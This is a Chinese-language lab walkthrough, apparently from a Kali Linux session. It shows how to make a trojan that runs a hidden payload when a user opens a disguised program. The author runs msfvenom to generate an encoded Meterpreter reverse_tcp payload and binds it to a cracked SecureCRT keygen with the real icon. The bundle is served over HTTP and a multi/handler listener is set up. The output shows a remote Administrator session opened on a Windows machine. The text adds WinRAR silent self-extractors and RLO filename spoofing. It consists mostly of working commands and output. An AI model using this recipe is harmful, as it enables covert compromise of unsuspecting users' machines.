除了注入代码还有一种捆绑程序的方式
就是不修改代码,打开的时候自动释放并运行

先安装go语言
┌──(root💀tyza66)-[~]
└─# apt -y install golang
下列软件包是自动安装的并且现在不需要了：       
  cpp-13                   libgfrpc0         librdmacm1t64
  ibverbs-providers        libgfxdr0         python3-lib2to3
  libboost-iostreams1.83.0 libglusterfs0     python3.11
  libboost-thread1.83.0    libibverbs1       python3.11-dev
  libcephfs2               libpython3.11-dev python3.11-minimal
  libgfapi0                librados2         samba-vfs-modules
使用'apt autoremove'来卸载它(它们)。

将要安装：
  golang
                                                                             
将要安装的依赖：
  golang-1.23     golang-1.23-go  golang-doc golang-src  pkgconf
  golang-1.23-doc golang-1.23-src golang-go  libpkgconf3 pkgconf-bin         
                                                                             
建议安装：
  bzr | brz mercurial

摘要：
  升级：0，安装：11，卸载：0，不升级：1906
  下载大小：46.4 MB
  所需的空间：243 MB / 83.5 GB 可用

获取:1 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-1.23-doc all 1.23.3-2 [109 kB]
获取:2 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-1.23-src all 1.23.3-2 [19.1 MB]
获取:3 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-1.23-go amd64 1.23.3-2 [27.0 MB]
获取:4 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-1.23 all 1.23.3-2 [15.5 kB]
获取:5 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-src all 2:1.23~2 [5,088 B]
获取:6 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-go amd64 2:1.23~2 [44.3 kB]
获取:7 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang-doc all 2:1.23~2 [5,108 B]
获取:8 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 golang amd64 2:1.23~2 [5,044 B]
获取:9 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 libpkgconf3 amd64 1.8.1-4 [36.4 kB]
获取:10 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 pkgconf-bin amd64 1.8.1-4 [30.2 kB]
获取:11 https://mirrors.ustc.edu.cn/kali kali-last-snapshot/main amd64 pkgconf amd64 1.8.1-4 [26.2 kB]
已下载 46.4 MB，耗时 7秒 (6,893 kB/s)                                       
正在选中未选择的软件包 golang-1.23-doc。
(正在读取数据库 ... 系统当前共安装有 417455 个文件和目录。)
准备解压 .../00-golang-1.23-doc_1.23.3-2_all.deb  ...
正在解压 golang-1.23-doc (1.23.3-2) ...
正在选中未选择的软件包 golang-1.23-src。
准备解压 .../01-golang-1.23-src_1.23.3-2_all.deb  ...
正在解压 golang-1.23-src (1.23.3-2) ...
正在选中未选择的软件包 golang-1.23-go。
准备解压 .../02-golang-1.23-go_1.23.3-2_amd64.deb  ...
正在解压 golang-1.23-go (1.23.3-2) ...
正在选中未选择的软件包 golang-1.23。
准备解压 .../03-golang-1.23_1.23.3-2_all.deb  ...
正在解压 golang-1.23 (1.23.3-2) ...
正在选中未选择的软件包 golang-src。
准备解压 .../04-golang-src_2%3a1.23~2_all.deb  ...
正在解压 golang-src (2:1.23~2) ...
正在选中未选择的软件包 golang-go:amd64。
准备解压 .../05-golang-go_2%3a1.23~2_amd64.deb  ...
正在解压 golang-go:amd64 (2:1.23~2) ...
正在选中未选择的软件包 golang-doc。
准备解压 .../06-golang-doc_2%3a1.23~2_all.deb  ...
正在解压 golang-doc (2:1.23~2) ...
正在选中未选择的软件包 golang:amd64。
准备解压 .../07-golang_2%3a1.23~2_amd64.deb  ...
正在解压 golang:amd64 (2:1.23~2) ...
正在选中未选择的软件包 libpkgconf3:amd64。
准备解压 .../08-libpkgconf3_1.8.1-4_amd64.deb  ...
正在解压 libpkgconf3:amd64 (1.8.1-4) ...
正在选中未选择的软件包 pkgconf-bin。
准备解压 .../09-pkgconf-bin_1.8.1-4_amd64.deb  ...
正在解压 pkgconf-bin (1.8.1-4) ...
正在选中未选择的软件包 pkgconf:amd64。
准备解压 .../10-pkgconf_1.8.1-4_amd64.deb  ...
正在解压 pkgconf:amd64 (1.8.1-4) ...
正在设置 golang-1.23-doc (1.23.3-2) ...
正在设置 libpkgconf3:amd64 (1.8.1-4) ...
正在设置 golang-1.23-src (1.23.3-2) ...
正在设置 pkgconf-bin (1.8.1-4) ...
正在设置 golang-src (2:1.23~2) ...
正在设置 pkgconf:amd64 (1.8.1-4) ...
正在设置 golang-1.23-go (1.23.3-2) ...
正在设置 golang-1.23 (1.23.3-2) ...
正在设置 golang-go:amd64 (2:1.23~2) ...
正在设置 golang-doc (2:1.23~2) ...
正在设置 golang:amd64 (2:1.23~2) ...
正在处理用于 libc-bin (2.38-10) 的触发器 ...
正在处理用于 man-db (2.12.1-1) 的触发器 ...
正在处理用于 kali-menu (2023.4.7) 的触发器 ...
                                                                             
┌──(root💀tyza66)-[~]
└─# go -version
flag provided but not defined: -version
Go is a tool for managing Go source code.

Usage:

        go <command> [arguments]

The commands are:

        bug         start a bug report
        build       compile packages and dependencies
        clean       remove object files and cached files
        doc         show documentation for package or symbol
        env         print Go environment information
        fix         update packages to use new APIs
        fmt         gofmt (reformat) package sources
        generate    generate Go files by processing source
        get         add dependencies to current module and install them
        install     compile and install packages and dependencies
        list        list packages or modules
        mod         module maintenance
        work        workspace maintenance
        run         compile and run Go program
        telemetry   manage telemetry data and settings
        test        test packages
        tool        run specified go tool
        version     print Go version
        vet         report likely mistakes in packages

Use "go help <command>" for more information about a command.

Additional help topics:

        buildconstraint build constraints
        buildmode       build modes
        c               calling between Go and C
        cache           build and test caching
        environment     environment variables
        filetype        file types
        go.mod          the go.mod file
        gopath          GOPATH environment variable
        goproxy         module proxy protocol
        importpath      import path syntax
        modules         modules, module versions, and more
        module-auth     module authentication using go.sum
        packages        package lists and patterns
        private         configuration for downloading non-public code
        testflag        testing flags
        testfunc        testing functions
        vcs             controlling version control with GOVCS

Use "go help <topic>" for more information about that topic.

                                                                             
┌──(root💀tyza66)-[~]
└─# go version 
go version go1.23.3 linux/amd64
                                                                             
┌──(root💀tyza66)-[~]
└─# 

然后我们要用到一个bind程序
传上去之后给权限
┌──(root💀tyza66)-[~]
└─# cd /home
                                                                                                                           
┌──(root💀tyza66)-[/home]
└─# chmod -x binding
                                                                                                                           
┌──(root💀tyza66)-[/home]
└─# ls
binding  dvwa.pcap  external.zip  tyza66
                                                                                                                           
┌──(root💀tyza66)-[/home]
└─# 

之后我们先用msf生成恶意程序

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o msf.exe

┌──(root💀tyza66)-[~]
└─# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o msf.exe
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes
Saved as: msf.exe
                                                                             
┌──(root💀tyza66)-[~]
└─# 

不是编码次数越多编码能力越强
先看一下binding的用法
┌──(root💀tyza66)-[~]
└─# ls                              
服务器账密.txt  视频  下载  aircrack_8812au  hello.txt
公共            图片  音乐  bak.xml          home
模板            文档  桌面  Desktop          msf.exe
                                                                             
┌──(root💀tyza66)-[~]
└─# cd /home
                                                                             
┌──(root💀tyza66)-[/home]
└─# ,.binding
,.binding：未找到命令
                                                                             
┌──(root💀tyza66)-[/home]
└─# ,/binding
zsh: 没有那个文件或目录: ,/binding
                                                                             
┌──(root💀tyza66)-[/home]
└─# ./binding
zsh: 权限不够: ./binding
                                                                             
┌──(root💀tyza66)-[/home]
└─# chmod -x binding
                                                                             
┌──(root💀tyza66)-[/home]
└─# ./binding       
zsh: 权限不够: ./binding
                                                                             
┌──(root💀tyza66)-[/home]
└─# chmod 777 binding
                                                                             
┌──(root💀tyza66)-[/home]
└─# ./binding        

使用方法：chmod +x binding                                                   
命令参数：./binding -m 木马文件 -s 正常文件 -i icon图标 -p 文件释放路径      
-p    可选参数，指定文件释放路径，默认路径: C:\\Users\\Public\\              
绑定后的exe文件会生成在output目录中。                                        
┌──(root💀tyza66)-[/home]
└─#  ./binding -m ~/msf.exe -s /home/SecureCRT-kg.exe -i /home/SecureCRT-kg.ico -p C:\\windows\\temp\\


output file: output/payload.exe successed!!! 

注意/p指定的路径必须是系统存在的  

 mac arm 的 bingding 用这个 binding-linux-arm64，另外 msf 生成 exe 的时候
不要指定架构。
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53
LPORT=4444 -f exe -o msf.exe
下载到本地，注意关闭杀软，msf 生成的 exe 文件会报毒。
└─# sz output/payload.exe

之后去看看
┌──(root💀tyza66)-[/home]
└─# ls
binding    external.zip  SecureCRT-kg.exe  tyza66
dvwa.pcap  output        SecureCRT-kg.ico
                                                                             
┌──(root💀tyza66)-[/home]
└─# cd output 
                                                                             
┌──(root💀tyza66)-[/home/output]
└─# ls
payload.exe

我们可以用py在当前目录开个http服务之后下载
                                                                             
┌──(root💀tyza66)-[/home/output]
└─# cd /home
                                                                             
┌──(root💀tyza66)-[/home]
└─# python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

我发现我的程序没有图标也打不开 重新弄一下包

┌──(root💀tyza66)-[~]
└─# pwd                       
/root
                                                                             
┌──(root💀tyza66)-[~]
└─# ./binding -m msf.exe -s SecureCRT-kg.exe -i SecureCRT-kg.ico -p C:\\windows\\temp\\ 
output file: output/payload.exe successed!!!                                                                             
┌──(root💀tyza66)-[~]
└─# python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

下载过去之后可以伪装一下
之后我们回kali 启动一下监听 那边设置的是什么payload 这边就设置什么
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.101.53
LHOST => 192.168.101.53
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, pro
                                        cess, none)
   LHOST     192.168.101.53   yes       The listen address (an interface may be specif
                                        ied)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

之后run就开始监听了
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 

之后回到win10使用问题程序

这时会发现终端来了
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.101.53:4444 
[*] Sending stage (176198 bytes) to 192.168.101.111
[*] Meterpreter session 4 opened (192.168.101.53:4444 -> 192.168.101.111:49693) at 2025-02-17 15:11:48 +0800

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: DESKTOP-ASI6V22\Administrator
meterpreter > 


这样就利用成功了
接下来试一下winrar捆绑恶意程序之后上线
先生成一个木马程序
┌──(root💀tyza66)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.101.53 LRPORT=4444 -f exe -o /var/www/html/dongman.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: /var/www/html/dongman.exe

开启一下apache 好方便被下载
┌──(root💀tyza66)-[~]
└─# systemctl start apache2    
                                                                             
将文件下载到windows 之后使用winrar打包自解压程序 并静默且更换图标
可以使用RLO伪装一下
然后来可以再最左侧插入LRO



